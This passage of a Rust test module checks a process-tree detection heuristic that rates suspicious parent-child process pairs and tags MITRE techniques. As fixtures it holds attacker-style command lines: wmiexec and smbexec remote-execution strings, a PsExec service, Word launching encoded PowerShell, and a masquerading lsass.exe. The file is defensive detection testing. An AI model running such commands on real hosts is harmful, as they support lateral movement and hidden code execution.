        assert!(plain[0].mitre.contains(&"T1047".to_string()));
        let wmiexec = analyze_pair(
            wmi,
            proc(
                31,
                30,
                r"C:\Windows\System32\cmd.exe",
                r"cmd.exe /Q /c cd \ 1> \\127.0.0.1\ADMIN$\__1700000000.12 2>&1",
            ),
        );
        assert_eq!(wmiexec[0].severity, cairn_core::Severity::Critical);
        assert!(wmiexec[0]
            .details_client
            .as_deref()
            .unwrap()
            .contains("wmiexec"));
    }

    #[test]
    fn services_exe_remote_service_execution_is_t1569_002() {
        let services = proc(40, 1, r"C:\Windows\System32\services.exe", "");
        let smbexec = analyze_pair(
            services.clone(),
            proc(
                41,
                40,
                r"C:\Windows\System32\cmd.exe",
                r"%COMSPEC% /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat",
            ),
        );
        assert_eq!(smbexec.len(), 1);
        assert_eq!(smbexec[0].severity, cairn_core::Severity::High);
        assert!(smbexec[0].mitre.contains(&"T1569.002".to_string()));
        let psexesvc = analyze_pair(
            services.clone(),
            proc(42, 40, r"C:\Windows\PSEXESVC.exe", ""),
        );
        assert!(psexesvc[0].mitre.contains(&"T1569.002".to_string()));
        // services.exe starting cmd for an ordinary service command is not flagged
        let benign = analyze_pair(
            services,
            proc(
                43,
                40,
                r"C:\Windows\System32\cmd.exe",
                r"cmd /c C:\svc\start.bat",
            ),
        );
        assert!(benign.is_empty());
    }

    /// A system binary name inside the Windows tree but outside its canonical
    /// directory is High (no longer trusted just for being under C:\Windows).
    #[test]
    fn system_name_outside_canonical_dir_inside_windows_is_high() {
        let p = rec(proc(
            502,
            0,
            r"C:\Windows\System32\spool\drivers\color\lsass.exe",
            "",
        ));
        let f = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, cairn_core::Severity::High);
        assert!(f[0].mitre.contains(&"T1036.005".to_string()));
        let reason = f[0].reason.as_deref().unwrap();
        assert!(reason.contains(r"C:\windows\system32"), "{reason}");
        assert!(f[0]
            .details_client
            .as_deref()
            .unwrap()
            .contains("lsass.exe"));
    }

    /// The client sentence names the strongest signal, never the old generic line.
    #[test]
    fn client_text_is_specific_to_the_strongest_signal() {
        let f = analyze_pair(
            proc(100, 4, r"C:\Program Files\Microsoft Office\winword.exe", ""),
            proc(
                200,
                100,
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
            ),
        );
        let client = f[0].details_client.as_deref().unwrap();
        assert!(client.contains("winword.exe"), "{client}");
        assert!(client.contains("巨集"), "{client}");
    }

    /// The real svchost.exe in its legitimate System32 home must never fire the
    /// masquerade signal.
    #[test]
    fn real_svchost_in_system32_does_not_fire() {
        let p = rec(proc(501, 0, r"C:\Windows\System32\svchost.exe", ""));
        let findings = ParentChildHeuristic.analyze(&[p], &[]).expect("analyze");
        assert!(
            findings.is_empty(),
            "legitimate svchost.exe must not be flagged"
        );
    }
}
